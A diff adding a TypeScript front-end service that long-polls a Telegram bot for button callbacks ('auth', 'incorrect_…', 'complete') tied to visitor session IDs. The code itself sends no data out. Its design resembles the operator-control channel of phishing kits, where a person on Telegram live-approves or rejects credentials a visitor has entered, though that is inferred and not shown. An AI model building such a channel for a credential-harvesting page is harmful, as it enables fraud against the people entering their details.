@@ -1,0 +1,328 @@
+// Optimized Telegram Service for Production
+// Minimal overhead, maximum performance
+
+import { getSession } from "./telegram-service-enhanced";
+import { liteFetch } from "./network-manager-lite";
+
+const TELEGRAM_BOT_TOKEN =
+  import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";
+const TELEGRAM_CHAT_ID =
+  import.meta.env.VITE_TELEGRAM_CHAT_ID || "YOUR_CHAT_ID";
+
+interface CallbackHandler {
+  sessionId: string;
+  onCallback: (action: string) => void;
+  registeredAt: number;
+  lastUsed: number;
+}
+
+class OptimizedTelegramService {
+  private handlers = new Map<string, CallbackHandler>();
+  private isPolling = false;
+  private pollInterval: NodeJS.Timeout | null = null;
+  private currentPollDelay = 4000; // Start with 4 seconds
+  private lastUpdateId = 0;
+  private consecutiveErrors = 0;
+  private maxErrors = 5; // Reduced for faster recovery
+  private processingCommands = new Set<string>();
+
+  /**
+   * Register handler (simplified)
+   */
+  registerHandler(
+    sessionId: string,
+    onCallback: (action: string) => void,
+  ): void {
+    console.log("📝 Registering handler:", sessionId.slice(-8));
+
+    this.handlers.set(sessionId, {
+      sessionId,
+      onCallback,
+      registeredAt: Date.now(),
+      lastUsed: Date.now(),
+    });
+
+    if (!this.isPolling && this.handlers.size > 0) {
+      this.startPolling();
+    }
+
+    this.cleanupOldHandlers();
+  }
+
+  /**
+   * Start polling (optimized)
+   */
+  async startPolling(): Promise<void> {
+    if (this.isPolling) return;
+
+    if (!this.validateConfiguration()) {
+      console.log("🚫 Invalid configuration");
+      return;
+    }
+
+    console.log("🔄 Starting optimized polling...");
+    this.isPolling = true;
+    this.consecutiveErrors = 0;
+
+    // Start polling immediately
+    this.pollForUpdates();
+  }
+
+  /**
+   * Optimized polling
+   */
+  private async pollForUpdates(): Promise<void> {
+    if (!this.isPolling) return;
+
+    try {
+      const response = await liteFetch(
+        `getUpdates?offset=${this.lastUpdateId + 1}&limit=10&timeout=20`,
+        {
+          method: "GET",
+          signal: AbortSignal.timeout(25000),
+        },
+        TELEGRAM_BOT_TOKEN,
+      );
+
+      if (!response.ok) {
+        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+      }
+
+      const data = await response.json();
+
+      if (!data.ok) {
+        throw new Error(`API Error: ${data.description || "Unknown"}`);
+      }
+
+      // Process updates
+      if (data.result && data.result.length > 0) {
+        for (const update of data.result) {
+          this.lastUpdateId = update.update_id;
+
+          if (update.callback_query) {
+            await this.handleCallback(update.callback_query);
+          }
+        }
+      }
+
+      // Reset on success
+      this.consecutiveErrors = 0;
+      this.currentPollDelay = Math.max(4000, this.currentPollDelay * 0.9);
+    } catch (error: any) {
+      this.consecutiveErrors++;
+      console.warn(`⚠️ Polling error (${this.consecutiveErrors}/${this.maxErrors}):`, error.message);
+
+      // Simple exponential backoff
+      this.currentPollDelay = Math.min(20000, this.currentPollDelay * 1.5);
+
+      // Stop if too many errors
+      if (this.consecutiveErrors >= this.maxErrors) {
+        console.error("❌ Too many errors, stopping polling");
+        this.stopPolling();
+        
+        // Restart after delay
+        setTimeout(() => {
+          if (this.handlers.size > 0) {
+            console.log("🔄 Restarting polling...");
+            this.consecutiveErrors = 0;
+            this.currentPollDelay = 4000;
+            this.startPolling();
+          }
+        }, 30000);
+        return;
+      }
+    }
+
+    // Schedule next poll
+    if (this.isPolling) {
+      this.pollInterval = setTimeout(() => {
+        this.pollForUpdates();
+      }, this.currentPollDelay);
+    }
+  }
+
+  /**
+   * Handle callback (simplified)
+   */
+  private async handleCallback(callback: any): Promise<void> {
+    const callbackData = callback.data;
+    const callbackId = callback.id;
+
+    // Parse callback data
+    const parsed = this.parseCallbackData(callbackData);
+    if (!parsed) return;
+
+    const { action, sessionId } = parsed;
+
+    // Check if session is processing
+    if (this.processingCommands.has(sessionId)) {
+      return;
+    }
+
+    // Find handler
+    const handler = this.handlers.get(sessionId);
+    if (!handler) {
+      return;
+    }
+
+    // Process callback
+    this.processingCommands.add(sessionId);
+
+    try {
+      // Answer callback (fire and forget)
+      this.answerCallbackQuery(callbackId, `✅ ${action}`).catch(() => {});
+
+      // Execute callback
+      handler.lastUsed = Date.now();
+      handler.onCallback(action);
+    } catch (error) {
+      console.error("❌ Callback error:", error);
+    } finally {
+      this.processingCommands.delete(sessionId);
+    }
+  }
+
+  /**
+   * Parse callback data
+   */
+  private parseCallbackData(
+    callbackData: string,
+  ): { action: string; sessionId: string } | null {
+    try {
+      const parts = callbackData.split("_");
+      if (parts.length < 2) return null;
+
+      let action: string;
+      let sessionId: string;
+
+      if (parts[0] === "auth") {
+        action = parts[1];
+        sessionId = parts.slice(2).join("_");
+      } else if (parts[0] === "incorrect") {
+        action = `incorrect_${parts[1]}`;
+        sessionId = parts.slice(2).join("_");
+      } else if (parts[0] === "complete") {
+        action = "complete";
+        sessionId = parts.slice(2).join("_");
+      } else {
+        return null;
+      }
+
+      return { action, sessionId };
+    } catch {
+      return null;
+    }
+  }
+
+  /**
+   * Answer callback query (simplified)
+   */
+  private async answerCallbackQuery(
+    callbackQueryId: string,
+    text: string,
+  ): Promise<void> {
+    if (!this.validateConfiguration()) return;
+
+    try {
+      await liteFetch(
+        "answerCallbackQuery",
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            callback_query_id: callbackQueryId,
+            text: text,
+            show_alert: false,
+          }),
+          signal: AbortSignal.timeout(3000),
+        },
+        TELEGRAM_BOT_TOKEN,
+      );
+    } catch {
+      // Silently handle errors
+    }
+  }
+
+  /**
+   * Stop polling
+   */
+  stopPolling(): void {
+    this.isPolling = false;
+    if (this.pollInterval) {
+      clearTimeout(this.pollInterval);
+      this.pollInterval = null;
+    }
+  }
+
+  /**
+   * Unregister handler
+   */
+  unregisterHandler(sessionId: string): void {
+    this.handlers.delete(sessionId);
+    this.processingCommands.delete(sessionId);
+
+    if (this.handlers.size === 0) {
+      this.stopPolling();
+    }
+  }
+
+  /**
+   * Clean up old handlers
+   */
+  private cleanupOldHandlers(): void {
+    const tenMinutesAgo = Date.now() - 10 * 60 * 1000;
+    
+    for (const [sessionId, handler] of this.handlers.entries()) {
+      if (handler.registeredAt < tenMinutesAgo) {
+        this.handlers.delete(sessionId);
+        this.processingCommands.delete(sessionId);
+      }
+    }
+  }
+
+  /**
+   * Validate configuration
+   */
+  private validateConfiguration(): boolean {
+    return !!(
+      TELEGRAM_BOT_TOKEN &&
+      TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN" &&
+      TELEGRAM_CHAT_ID &&
+      TELEGRAM_CHAT_ID !== "YOUR_CHAT_ID"
+    );
+  }
+
+  /**
+   * Get debug info
+   */
+  getDebugInfo() {
+    return {
+      isPolling: this.isPolling,
+      handlerCount: this.handlers.size,
+      currentDelay: this.currentPollDelay,
+      consecutiveErrors: this.consecutiveErrors,
+      lastUpdateId: this.lastUpdateId,
+    };
+  }
+}
+
+// Create singleton
+const optimizedTelegramService = new OptimizedTelegramService();
+
+// Export functions
+export const registerOptimizedCallback = (
+  sessionId: string,
+  onCallback: (action: string) => void,
+): void => {
+  optimizedTelegramService.registerHandler(sessionId, onCallback);
+};
+
+export const unregisterOptimizedCallback = (sessionId: string): void => {
+  optimizedTelegramService.unregisterHandler(sessionId);
+};
+
+export const getOptimizedTelegramDebugInfo = () => {
+  return optimizedTelegramService.getDebugInfo();
+};
+
+export { optimizedTelegramService };
